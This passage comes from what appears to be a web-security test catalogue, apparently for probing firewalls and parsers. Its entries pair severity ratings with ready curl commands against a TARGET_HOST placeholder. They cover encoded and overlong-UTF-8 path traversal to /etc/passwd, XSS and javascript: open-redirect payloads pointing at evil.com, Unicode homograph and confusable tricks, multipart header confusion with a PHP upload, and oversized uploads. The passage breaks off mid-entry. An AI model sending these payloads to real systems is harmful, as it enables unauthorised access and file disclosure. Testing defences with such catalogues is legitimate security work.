                    name: 'Parameter Type Confusion',
                    severity: 'high',
                    description: 'Tests type confusion in parameter handling',
                    scenarios: [
                        {
                            id: 'PARAM-024-A',
                            name: 'Boolean Confusion',
                            description: 'Boolean type confusion',
                            curl: 'curl "http://TARGET_HOST/?admin=true&admin=1&admin=yes" -v'
                        },
                        {
                            id: 'PARAM-024-B',
                            name: 'Array vs String',
                            description: 'Array vs string confusion',
                            curl: 'curl "http://TARGET_HOST/?ids=1&ids[]=2&ids[0]=3" -v'
                        },
                        {
                            id: 'PARAM-024-C',
                            name: 'Numeric vs String',
                            description: 'Numeric vs string confusion',
                            curl: 'curl "http://TARGET_HOST/?id=1&id=01&id=1.0" -v'
                        }
                    ]
                }
            ],
            'URI Encoding and Validation': [
                {
                    id: 'URI-003',
                    name: 'List URL-Encoded Reserved Characters',
                    severity: 'medium',
                    description: 'Tests URL encoding of reserved characters',
                    scenarios: [
                        {
                            id: 'URI-003-A',
                            name: 'Encoded Slash',
                            description: 'URL encoded forward slash',
                            curl: 'curl "http://TARGET_HOST/path%2Ftraversal%2Fattempt" -v'
                        },
                        {
                            id: 'URI-003-B',
                            name: 'Encoded Question Mark',
                            description: 'URL encoded question mark',
                            curl: 'curl "http://TARGET_HOST/file%3Fname%3Dtest" -v'
                        },
                        {
                            id: 'URI-003-C',
                            name: 'All Reserved Chars',
                            description: 'All reserved characters encoded',
                            curl: 'curl "http://TARGET_HOST/%3A%2F%3F%23%5B%5D%40%21%24%26%27%28%29%2A%2B%2C%3B%3D" -v'
                        }
                    ]
                },
                {
                    id: 'URI-004',
                    name: 'Allow Spaces in URI',
                    severity: 'medium',
                    description: 'Tests URI containing space characters',
                    scenarios: [
                        {
                            id: 'URI-004-A',
                            name: 'Unencoded Space',
                            description: 'Raw space in URI',
                            curl: 'curl "http://TARGET_HOST/path with spaces" -v'
                        },
                        {
                            id: 'URI-004-B',
                            name: 'Encoded Space',
                            description: 'URL encoded space (%20)',
                            curl: 'curl "http://TARGET_HOST/path%20with%20spaces" -v'
                        },
                        {
                            id: 'URI-004-C',
                            name: 'Plus as Space',
                            description: 'Plus sign as space',
                            curl: 'curl "http://TARGET_HOST/path+with+spaces" -v'
                        }
                    ]
                },
                {
                    id: 'URI-005',
                    name: 'Allow Low ASCII in URI',
                    severity: 'high',
                    description: 'Tests URI with non-printable ASCII characters',
                    scenarios: [
                        {
                            id: 'URI-005-A',
                            name: 'Null Byte in URI',
                            description: 'Null byte injection',
                            curl: 'curl "http://TARGET_HOST/file%00.txt" -v'
                        },
                        {
                            id: 'URI-005-B',
                            name: 'Control Chars in URI',
                            description: 'Various control characters',
                            curl: 'curl "http://TARGET_HOST/file%01%02%03%04%05" -v'
                        },
                        {
                            id: 'URI-005-C',
                            name: 'Tab and Newline',
                            description: 'Tab and newline in URI',
                            curl: 'curl "http://TARGET_HOST/path%09tab%0Anewline" -v'
                        }
                    ]
                },
                {
                    id: 'URI-006',
                    name: 'Allow High ASCII in URI',
                    severity: 'high',
                    description: 'Tests URI with high ASCII characters',
                    scenarios: [
                        {
                            id: 'URI-006-A',
                            name: 'Extended ASCII',
                            description: 'Extended ASCII in URI',
                            curl: 'curl "http://TARGET_HOST/%80%81%82%FF" -v'
                        },
                        {
                            id: 'URI-006-B',
                            name: 'Latin-1 in URI',
                            description: 'Latin-1 characters in path',
                            curl: 'curl "http://TARGET_HOST/caf%E9/men%FC" -v'
                        },
                        {
                            id: 'URI-006-C',
                            name: 'Mixed High ASCII',
                            description: 'Various high ASCII values',
                            curl: 'curl "http://TARGET_HOST/%F0%F1%F2%F3%F4%F5%F6%F7%F8%F9%FA%FB%FC%FD%FE%FF" -v'
                        }
                    ]
                },
                {
                    id: 'URI-007',
                    name: 'Allow UTF8 Parse Failure in URI',
                    severity: 'high',
                    description: 'Tests UTF8 parsing failures in URI',
                    scenarios: [
                        {
                            id: 'URI-007-A',
                            name: 'Invalid UTF8 in Path',
                            description: 'Malformed UTF8 in URI path',
                            curl: 'curl "http://TARGET_HOST/%C3%28/test" -v'
                        },
                        {
                            id: 'URI-007-B',
                            name: 'Incomplete UTF8',
                            description: 'Incomplete UTF8 sequence',
                            curl: 'curl "http://TARGET_HOST/test%C3" -v'
                        },
                        {
                            id: 'URI-007-C',
                            name: 'Overlong UTF8',
                            description: 'Overlong UTF8 encoding',
                            curl: 'curl "http://TARGET_HOST/%C0%AF%C0%AF/test" -v'
                        }
                    ]
                },
                {
                    id: 'URI-008',
                    name: 'Allow Unicode Parse Failure in URI',
                    severity: 'high',
                    description: 'Tests Unicode parsing failures in URI',
                    scenarios: [
                        {
                            id: 'URI-008-A',
                            name: 'Invalid Unicode',
                            description: 'Invalid Unicode in URI',
                            curl: 'curl "http://TARGET_HOST/%ED%A0%80/test" -v'
                        },
                        {
                            id: 'URI-008-B',
                            name: 'Unpaired Surrogate',
                            description: 'Unpaired surrogate in URI',
                            curl: 'curl "http://TARGET_HOST/%ED%A0%80/test" -v'
                        },
                        {
                            id: 'URI-008-C',
                            name: 'Invalid Code Points',
                            description: 'Invalid Unicode code points',
                            curl: 'curl "http://TARGET_HOST/%ED%BF%BF/test" -v'
                        }
                    ]
                },
                {
                    id: 'URI-009',
                    name: 'Do not Decode %5C in URI',
                    severity: 'medium',
                    description: 'Tests %5C (backslash) decoding in URI',
                    scenarios: [
                        {
                            id: 'URI-009-A',
                            name: 'Encoded Backslash',
                            description: 'URL encoded backslash',
                            curl: 'curl "http://TARGET_HOST/%5C..%5C..%5Cwindows%5Csystem32" -v'
                        },
                        {
                            id: 'URI-009-B',
                            name: 'Mixed Slashes',
                            description: 'Mix of forward and backslashes',
                            curl: 'curl "http://TARGET_HOST/path%5Cto%2Ffile" -v'
                        },
                        {
                            id: 'URI-009-C',
                            name: 'UNC Path',
                            description: 'UNC path with backslashes',
                            curl: 'curl "http://TARGET_HOST/%5C%5Cserver%5Cshare%5Cfile" -v'
                        }
                    ]
                },
                {
                    id: 'URI-010',
                    name: 'Double URL Encoding Attacks',
                    severity: 'critical',
                    description: 'Tests double URL encoding bypass techniques',
                    scenarios: [
                        {
                            id: 'URI-010-A',
                            name: 'Double-Encoded Slash',
                            description: 'Double-encoded forward slash',
                            curl: 'curl "http://TARGET_HOST/safe/%252F../%252F../etc/passwd" -v'
                        },
                        {
                            id: 'URI-010-B',
                            name: 'Double-Encoded Dot',
                            description: 'Double-encoded path traversal',
                            curl: 'curl "http://TARGET_HOST/safe/%252E%252E/%252E%252E/etc/passwd" -v'
                        },
                        {
                            id: 'URI-010-C',
                            name: 'Mixed Double Encoding',
                            description: 'Mix of normal and double encoding',
                            curl: 'curl "http://TARGET_HOST/safe/%2E%2E/%252E%252E/etc/passwd" -v'
                        }
                    ]
                },
                {
                    id: 'URI-011',
                    name: 'Unicode Normalization Attacks',
                    severity: 'high',
                    description: 'Tests Unicode normalization bypasses',
                    scenarios: [
                        {
                            id: 'URI-011-A',
                            name: 'Path with Combining Marks',
                            description: 'Using Unicode combining marks in path',
                            curl: 'curl "http://TARGET_HOST/a%CC%87dmin/config" -v'
                        },
                        {
                            id: 'URI-011-B',
                            name: 'NFC vs NFD Normalization',
                            description: 'Exploiting Unicode normalization forms',
                            curl: 'curl "http://TARGET_HOST/%C3%A5dmin/config" -v'
                        },
                        {
                            id: 'URI-011-C',
                            name: 'Path Traversal with Combining Chars',
                            description: 'Path traversal with combining characters',
                            curl: 'curl "http://TARGET_HOST/..%CC%80/../etc/passwd" -v'
                        }
                    ]
                },
                {
                    id: 'URI-012',
                    name: 'Multiple Encoding Representations',
                    severity: 'high',
                    description: 'Tests different encoding methods for same character',
                    scenarios: [
                        {
                            id: 'URI-012-A',
                            name: 'UTF-8 vs Latin-1',
                            description: 'UTF-8 vs Latin-1 encoding variations',
                            curl: 'curl "http://TARGET_HOST/%C3%B1/file" -H "Host: TARGET_HOST" -v'
                        },
                        {
                            id: 'URI-012-B',
                            name: 'Decimal vs Hex Encoding',
                            description: 'Decimal vs hexadecimal encoding',
                            curl: 'curl "http://TARGET_HOST/&#100;&#101;&#108;&#101;&#116;&#101;/file" -v'
                        },
                        {
                            id: 'URI-012-C',
                            name: 'Mixed Encoding Types',
                            description: 'Mix of different encoding types',
                            curl: 'curl "http://TARGET_HOST/%u0061%61&#97;/file" -v'
                        }
                    ]
                },
                {
                    id: 'URI-013',
                    name: 'Nested Encoding Attacks',
                    severity: 'critical',
                    description: 'Tests nested encoding attack techniques',
                    scenarios: [
                        {
                            id: 'URI-013-A',
                            name: 'Triple-Nested Encoding',
                            description: 'Triple URL encoding',
                            curl: 'curl "http://TARGET_HOST/%25%32%35%25%33%32%25%36%35/%25%32%35%25%33%32%25%36%35/etc/passwd" -v'
                        },
                        {
                            id: 'URI-013-B',
                            name: 'Mixed Depth Encoding',
                            description: 'Different encoding depths in same URL',
                            curl: 'curl "http://TARGET_HOST/path/%252E%252E/%2E%2E/%252E%252E/etc/passwd" -v'
                        },
                        {
                            id: 'URI-013-C',
                            name: 'Recursive Encoding',
                            description: 'Recursively encoded URL components',
                            curl: 'curl "http://TARGET_HOST/%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45/config" -v'
                        }
                    ]
                },
                {
                    id: 'URI-014',
                    name: 'IDN Homograph Attacks',
                    severity: 'high',
                    description: 'Tests Internationalized Domain Name homograph attacks',
                    scenarios: [
                        {
                            id: 'URI-014-A',
                            name: 'Cyrillic Homographs',
                            description: 'Using Cyrillic look-alike characters',
                            curl: 'curl "http://TARGET_HOST/redirect?url=http://аdmіn.example.com" -v'
                        },
                        {
                            id: 'URI-014-B',
                            name: 'Greek Homographs',
                            description: 'Using Greek look-alike characters',
                            curl: 'curl "http://TARGET_HOST/redirect?url=http://αdmιn.example.com" -v'
                        },
                        {
                            id: 'URI-014-C',
                            name: 'Mixed Script Confusables',
                            description: 'Using mixed script confusable characters',
                            curl: 'curl "http://TARGET_HOST/redirect?url=http://pаypal.com" -v'
                        }
                    ]
                },
                {
                    id: 'URI-015',
                    name: 'Exotic Unicode Spaces',
                    severity: 'medium',
                    description: 'Tests URL encoding with exotic Unicode space characters',
                    scenarios: [
                        {
                            id: 'URI-015-A',
                            name: 'Zero-Width Space',
                            description: 'Zero-width space in URL',
                            curl: 'curl "http://TARGET_HOST/admin%E2%80%8Barea/config" -v'
                        },
                        {
                            id: 'URI-015-B',
                            name: 'Non-Breaking Space',
                            description: 'Non-breaking space in URL',
                            curl: 'curl "http://TARGET_HOST/admin%C2%A0area/config" -v'
                        },
                        {
                            id: 'URI-015-C',
                            name: 'Multiple Unicode Spaces',
                            description: 'Various Unicode space variants',
                            curl: 'curl "http://TARGET_HOST/admin%E2%80%80%E2%80%81%E2%80%82area/config" -v'
                        }
                    ]
                },
                {
                    id: 'URI-016',
                    name: 'Bidirectional Text Manipulation',
                    severity: 'high',
                    description: 'Tests bidirectional Unicode character manipulation',
                    scenarios: [
                        {
                            id: 'URI-016-A',
                            name: 'RLO Character',
                            description: 'Right-to-Left Override character',
                            curl: 'curl "http://TARGET_HOST/file%E2%80%AEfdp.exe" -v'
                        },
                        {
                            id: 'URI-016-B',
                            name: 'RLI/PDI Wrapping',
                            description: 'Right-to-Left Isolate with Pop Directional Isolate',
                            curl: 'curl "http://TARGET_HOST/file%E2%81%A6exe.pdf%E2%81%A9" -v'
                        },
                        {
                            id: 'URI-016-C',
                            name: 'Mixed Directional Controls',
                            description: 'Mix of directional control characters',
                            curl: 'curl "http://TARGET_HOST/file%E2%80%AE%E2%80%AEexe.pdf" -v'
                        }
                    ]
                },
                {
                    id: 'URI-017',
                    name: 'Overlong UTF-8 Encoding Variations',
                    severity: 'critical',
                    description: 'Tests variations of overlong UTF-8 encoding',
                    scenarios: [
                        {
                            id: 'URI-017-A',
                            name: '2-Byte Overlong',
                            description: '2-byte overlong encoding of ASCII',
                            curl: 'curl "http://TARGET_HOST/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd" -v'
                        },
                        {
                            id: 'URI-017-B',
                            name: '3-Byte Overlong',
                            description: '3-byte overlong encoding of ASCII',
                            curl: 'curl "http://TARGET_HOST/%E0%80%AE%E0%80%AE/%E0%80%AE%E0%80%AE/etc/passwd" -v'
                        },
                        {
                            id: 'URI-017-C',
                            name: '4-Byte Overlong',
                            description: '4-byte overlong encoding of ASCII',
                            curl: 'curl "http://TARGET_HOST/%F0%80%80%AE%F0%80%80%AE/%F0%80%80%AE%F0%80%80%AE/etc/passwd" -v'
                        }
                    ]
                },
                {
                    id: 'URI-018',
                    name: 'URL Authority Component Manipulation',
                    severity: 'high',
                    description: 'Tests manipulation of URL authority component',
                    scenarios: [
                        {
                            id: 'URI-018-A',
                            name: 'Username in Authority',
                            description: 'Inserting username in authority component',
                            curl: 'curl "http://user@TARGET_HOST/admin" -v'
                        },
                        {
                            id: 'URI-018-B',
                            name: 'Credentials in Authority',
                            description: 'Inserting username:password in authority',
                            curl: 'curl "http://user:password@TARGET_HOST/admin" -v'
                        },
                        {
                            id: 'URI-018-C',
                            name: 'Special Chars in Authority',
                            description: 'Special characters in authority component',
                            curl: 'curl "http://user%01:%02@TARGET_HOST/admin" -v'
                        }
                    ]
                },
                {
                    id: 'URI-019',
                    name: 'Custom Encoding Schemes',
                    severity: 'high',
                    description: 'Tests non-standard encoding schemes in URLs',
                    scenarios: [
                        {
                            id: 'URI-019-A',
                            name: 'Base64 in URL',
                            description: 'Base64-encoded path segments',
                            curl: 'curl "http://TARGET_HOST/L2V0Yy9wYXNzd2Q=" -v'
                        },
                        {
                            id: 'URI-019-B',
                            name: 'Hex String Encoding',
                            description: 'Hexadecimal string encoding in URL',
                            curl: 'curl "http://TARGET_HOST/0x2f6574632f706173737764" -v'
                        },
                        {
                            id: 'URI-019-C',
                            name: 'Octal Encoding',
                            description: 'Octal encoding in URL',
                            curl: 'curl "http://TARGET_HOST/057145164143057160141163163167144" -v'
                        }
                    ]
                },
                {
                    id: 'URI-020',
                    name: 'Unicode Confusables',
                    severity: 'high',
                    description: 'Tests Unicode confusable characters in URLs',
                    scenarios: [
                        {
                            id: 'URI-020-A',
                            name: 'Confusable Punctuation',
                            description: 'Confusable punctuation characters',
                            curl: 'curl "http://TARGET_HOST/admin%EF%B9%90config" -v'
                        },
                        {
                            id: 'URI-020-B',
                            name: 'Confusable Letters',
                            description: 'Confusable letter characters',
                            curl: 'curl "http://TARGET_HOST/%F0%9D%90%9Admin/config" -v'
                        },
                        {
                            id: 'URI-020-C',
                            name: 'Mixed Confusables',
                            description: 'Mix of confusable characters',
                            curl: 'curl "http://TARGET_HOST/%F0%9D%90%9A%F0%9D%90%9Dmin%EF%BC%8Fconfig" -v'
                        }
                    ]
                },
                {
                    id: 'URI-021',
                    name: 'IRI (Internationalized Resource Identifier) Tests',
                    severity: 'medium',
                    description: 'Tests handling of Internationalized Resource Identifiers',
                    scenarios: [
                        {
                            id: 'URI-021-A',
                            name: 'Non-ASCII Domain',
                            description: 'Non-ASCII characters in domain name',
                            curl: 'curl "http://例子.测试/admin" -H "Host: xn--fsqu00a.xn--0zwm56d" -v'
                        },
                        {
                            id: 'URI-021-B',
                            name: 'Non-ASCII Path',
                            description: 'Non-ASCII characters in path',
                            curl: 'curl "http://TARGET_HOST/管理员/配置" -v'
                        },
                        {
                            id: 'URI-021-C',
                            name: 'Mixed IRI Components',
                            description: 'Mix of non-ASCII in various URL components',
                            curl: 'curl "http://TARGET_HOST/用户?名称=管理员&权限=完全" -v'
                        }
                    ]
                },
                {
                    id: 'URI-022',
                    name: 'Character Set Confusion',
                    severity: 'high',
                    description: 'Tests confusion between character sets in URLs',
                    scenarios: [
                        {
                            id: 'URI-022-A',
                            name: 'UTF-8 vs. ISO-8859-1',
                            description: 'Confusion between UTF-8 and ISO-8859-1',
                            curl: 'curl "http://TARGET_HOST/%E9%A6%96%E9%A1%B5" -H "Accept-Charset: ISO-8859-1" -v'
                        },
                        {
                            id: 'URI-022-B',
                            name: 'Shift-JIS Confusion',
                            description: 'Exploiting Shift-JIS decoding',
                            curl: 'curl "http://TARGET_HOST/%95%5C%8C%A9%8F%91" -H "Accept-Charset: Shift-JIS" -v'
                        },
                        {
                            id: 'URI-022-C',
                            name: 'UTF-16 Encoded URL',
                            description: 'URL components encoded as UTF-16',
                            curl: 'curl "http://TARGET_HOST/%FE%FF%00a%00d%00m%00i%00n" -v'
                        }
                    ]
                },
                {
                    id: 'URI-023',
                    name: 'Case Normalization Issues',
                    severity: 'medium',
                    description: 'Tests case normalization issues in URLs',
                    scenarios: [
                        {
                            id: 'URI-023-A',
                            name: 'Case-Sensitive Path',
                            description: 'Case variations in path components',
                            curl: 'curl "http://TARGET_HOST/AdMiN/ConFig" -v'
                        },
                        {
                            id: 'URI-023-B',
                            name: 'Unicode Case Folding',
                            description: 'Unicode case folding variations',
                            curl: 'curl "http://TARGET_HOST/%c3%9feta" -v'
                        },
                        {
                            id: 'URI-023-C',
                            name: 'Titlecase Characters',
                            description: 'Using Unicode titlecase characters',
                            curl: 'curl "http://TARGET_HOST/%E1%BA%9E%E1%B4%80%E1%B4%9B%CA%9C" -v'
                        }
                    ]
                },
                {
                    id: 'URI-024',
                    name: 'URL Validation Bypasses',
                    severity: 'critical',
                    description: 'Tests bypassing URL validation mechanisms',
                    scenarios: [
                        {
                            id: 'URI-024-A',
                            name: 'Protocol-Relative URL',
                            description: 'Using protocol-relative URL',
                            curl: 'curl "http://TARGET_HOST/redirect?url=//evil.com/malicious.js" -v'
                        },
                        {
                            id: 'URI-024-B',
                            name: 'Data URI Scheme',
                            description: 'Using data: URI scheme',
                            curl: 'curl "http://TARGET_HOST/redirect?url=data:text/html,<script>alert(document.domain)< /script>" -v'
                        },
                        {
                            id: 'URI-024-C',
                            name: 'Validation Regex Bypass',
                            description: 'Bypassing validation regex patterns',
                            curl: 'curl "http://TARGET_HOST/redirect?url=https:evil.com" -v'
                        }
                    ]
                },
                {
                    id: 'URI-025',
                    name: 'Invisible Characters in URLs',
                    severity: 'high',
                    description: 'Tests invisible Unicode characters in URLs',
                    scenarios: [
                        {
                            id: 'URI-025-A',
                            name: 'Zero-Width Joiner',
                            description: 'Zero-width joiner in URL path',
                            curl: 'curl "http://TARGET_HOST/admin%E2%80%8Dconfig" -v'
                        },
                        {
                            id: 'URI-025-B',
                            name: 'Word Joiner',
                            description: 'Word joiner in URL path',
                            curl: 'curl "http://TARGET_HOST/admin%E2%81%A0config" -v'
                        },
                        {
                            id: 'URI-025-C',
                            name: 'Invisible Separators',
                            description: 'Various invisible separator characters',
                            curl: 'curl "http://TARGET_HOST/admin%E2%80%8B%E2%80%8C%E2%80%8Dconfig" -v'
                        }
                    ]
                },
                {
                    id: 'URI-026',
                    name: 'URL Parsing Ambiguities',
                    severity: 'high',
                    description: 'Tests URL parsing ambiguities between components',
                    scenarios: [
                        {
                            id: 'URI-026-A',
                            name: 'Authority vs Path Confusion',
                            description: 'Ambiguity between authority and path',
                            curl: 'curl "http://TARGET_HOST@evil.com" -v'
                        },
                        {
                            id: 'URI-026-B',
                            name: 'Query vs Fragment Confusion',
                            description: 'Ambiguity between query and fragment',
                            curl: 'curl "http://TARGET_HOST/page?query#fragment?injection=1" -v'
                        },
                        {
                            id: 'URI-026-C',
                            name: 'Multiple URI Schemes',
                            description: 'Using multiple URI schemes',
                            curl: 'curl "http://TARGET_HOST/redirect?url=javascript:http://evil.com" -v'
                        }
                    ]
                },
                {
                    id: 'URI-027',
                    name: 'Multiple Encodings in URL',
                    severity: 'high',
                    description: 'Tests URLs with multiple encoding methods',
                    scenarios: [
                        {
                            id: 'URI-027-A',
                            name: 'Mixed URL and HTML Encoding',
                            description: 'Mixing URL and HTML encoding',
                            curl: 'curl "http://TARGET_HOST/redirect?url=javascript:alert%28%26%2339%3Bxss%26%2339%3B%29" -v'
                        },
                        {
                            id: 'URI-027-B',
                            name: 'Unicode and URL Encoding',
                            description: 'Mixing Unicode and URL encoding',
                            curl: 'curl "http://TARGET_HOST/redirect?url=%C0%BCavascript:alert(1)" -v'
                        },
                        {
                            id: 'URI-027-C',
                            name: 'Triple Encoding Mix',
                            description: 'Mix of three encoding schemes',
                            curl: 'curl "http://TARGET_HOST/redirect?url=j%61v%61%73%63%72%69%70%74:%26%23x61%3Blert%281%29" -v'
                        }
                    ]
                },
                {
                    id: 'URI-028',
                    name: 'URL Decoder Differential Analysis',
                    severity: 'critical',
                    description: 'Tests differences between URL decoders in processing chain',
                    scenarios: [
                        {
                            id: 'URI-028-A',
                            name: 'Proxy vs Application Decoder',
                            description: 'Exploiting differences between proxy and application',
                            curl: 'curl "http://TARGET_HOST/redirect?url=javascript:alert(1)" -H "X-Forwarded-Url: http://safe.com" -v'
                        },
                        {
                            id: 'URI-028-B',
                            name: 'WAF vs Application Decoder',
                            description: 'Exploiting differences between WAF and application',
                            curl: 'curl "http://TARGET_HOST/redirect?url=javascript%3A%2561lert(1)" -v'
                        },
                        {
                            id: 'URI-028-C',
                            name: 'Multi-Layer Decoder Confusion',
                            description: 'Exploiting multi-layer decoder differences',
                            curl: 'curl "http://TARGET_HOST/redirect?url=javascript%253Aalert(document.domain)" -v'
                        }
                    ]
                },
                {
                    id: 'URI-029',
                    name: 'URL Fragment Manipulation',
                    severity: 'medium',
                    description: 'Tests manipulation of URL fragments',
                    scenarios: [
                        {
                            id: 'URI-029-A',
                            name: 'Fragment Injection',
                            description: 'JavaScript execution via fragment',
                            curl: 'curl "http://TARGET_HOST/page#javascript:alert(document.domain)" -v'
                        },
                        {
                            id: 'URI-029-B',
                            name: 'XSS in Fragment',
                            description: 'XSS payload in fragment',
                            curl: 'curl "http://TARGET_HOST/page#<img src=x onerror=alert(1)>" -v'
                        },
                        {
                            id: 'URI-029-C',
                            name: 'Fragment Parameter Pollution',
                            description: 'Parameter pollution via fragment',
                            curl: 'curl "http://TARGET_HOST/page?id=1#id=2" -v'
                        }
                    ]
                },
                {
                    id: 'URI-030',
                    name: 'URL Canonicalization Issues',
                    severity: 'high',
                    description: 'Tests issues with URL canonicalization',
                    scenarios: [
                        {
                            id: 'URI-030-A',
                            name: 'Directory Traversal Normalization',
                            description: 'Path traversal after canonicalization',
                            curl: 'curl "http://TARGET_HOST/safe/file/../../etc/passwd" -v'
                        },
                        {
                            id: 'URI-030-B',
                            name: 'Duplicate Slashes',
                            description: 'Multiple consecutive slashes',
                            curl: 'curl "http://TARGET_HOST///admin//config" -v'
                        },
                        {
                            id: 'URI-030-C',
                            name: 'Mixed Encoding Canonicalization',
                            description: 'Mix of encoded and decoded characters',
                            curl: 'curl "http://TARGET_HOST/%2e%2e/%2e%2e/etc/passwd" -v'
                        }
                    ]
                }
            ],
          'File Upload and Multipart': [
    {
        id: 'UPLOAD-001',
        name: 'Fast Upload for Large HTTP Requests',
        severity: 'high',
        description: 'Tests large HTTP request handling',
        scenarios: [
            {
                id: 'UPLOAD-001-A',
                name: 'Large POST Body',
                description: 'Very large POST request body',
                curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: application/octet-stream" --data-binary @<(head -c 10485760 /dev/zero | base64) -v'
            },
            {
                id: 'UPLOAD-001-B',
                name: 'Large JSON Upload',
                description: 'Large JSON payload',
                curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"data":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}\' -v'
            },
            {
                id: 'UPLOAD-001-C',
                name: 'Slow Upload',
                description: 'Slow large upload for timeout',
                curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: application/octet-stream" --data-binary @<(head -c 1048576 /dev/zero | base64) --limit-rate 1k -v'
            }
        ]
    },
                {
                    id: 'UPLOAD-002',
                    name: 'Fast Upload for Large HTTP Requests with Files',
                    severity: 'high',
                    description: 'Tests large file upload handling',
                    scenarios: [
                        {
                            id: 'UPLOAD-002-A',
                            name: 'Large File Upload',
                            description: 'Upload large file',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(head -c 52428800 /dev/zero)" -v'
                        },
                        {
                            id: 'UPLOAD-002-B',
                            name: 'Multiple Large Files',
                            description: 'Upload multiple large files',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file1=@<(head -c 10485760 /dev/zero)" -F "file2=@<(head -c 10485760 /dev/zero)" -v'
                        },
                        {
                            id: 'UPLOAD-002-C',
                            name: 'Chunked File Upload',
                            description: 'Chunked transfer encoding',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Transfer-Encoding: chunked" -T <(head -c 20971520 /dev/zero) -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-001',
                    name: 'Allow Double Content-Disposition in MultiPart',
                    severity: 'medium',
                    description: 'Tests multiple Content-Disposition headers',
                    scenarios: [
                        {
                            id: 'MULTIPART-001-A',
                            name: 'Double Content-Disposition',
                            description: 'Two Content-Disposition headers',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"\\r\\nContent-Disposition: form-data; name="evil"\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-001-B',
                            name: 'Conflicting Dispositions',
                            description: 'Conflicting disposition values',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="safe"\\r\\nContent-Disposition: attachment; filename="evil.php"\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-001-C',
                            name: 'Triple Disposition',
                            description: 'Three Content-Disposition headers',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data\\r\\nContent-Disposition: attachment\\r\\nContent-Disposition: inline\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-002',
                    name: 'Allow MultiPart without CR LF',
                    severity: 'low',
                    description: 'Tests multipart data without proper line endings',
                    scenarios: [
                        {
                            id: 'MULTIPART-002-A',
                            name: 'LF Only',
                            description: 'Only LF without CR',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\nContent-Disposition: form-data; name="file"\\n\\ndata\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-002-B',
                            name: 'No Line Endings',
                            description: 'No CR or LF',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" -d "------TestContent-Disposition: form-data; name=\\"file\\"data------Test--" -v'
                        },
                        {
                            id: 'MULTIPART-002-C',
                            name: 'Mixed Line Endings',
                            description: 'Mix of CRLF and LF',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"\\n\\ndata\\r\\n------Test--\' -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-003',
                    name: 'Allow MultiPart Space Error',
                    severity: 'low',
                    description: 'Tests multipart with spacing errors',
                    scenarios: [
                        {
                            id: 'MULTIPART-003-A',
                            name: 'Space Before Boundary',
                            description: 'Space before boundary marker',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\' ------Test\\r\\nContent-Disposition: form-data; name="file"\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-003-B',
                            name: 'Space in Boundary',
                            description: 'Space within boundary',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=---- Test" --data-binary $\'---- Test\\r\\nContent-Disposition: form-data; name="file"\\r\\n\\r\\ndata\\r\\n---- Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-003-C',
                            name: 'Tab Instead of Space',
                            description: 'Tab character in headers',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition:\\tform-data;\\tname="file"\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-004',
                    name: 'Missing Content-Disposition Delimiter',
                    severity: 'medium',
                    description: 'Tests missing delimiters in Content-Disposition',
                    scenarios: [
                        {
                            id: 'MULTIPART-004-A',
                            name: 'Missing Semicolon',
                            description: 'No semicolon delimiter',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data name="file"\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-004-B',
                            name: 'Missing Quotes',
                            description: 'No quotes around values',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name=file\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-004-C',
                            name: 'Missing Equals',
                            description: 'No equals sign',
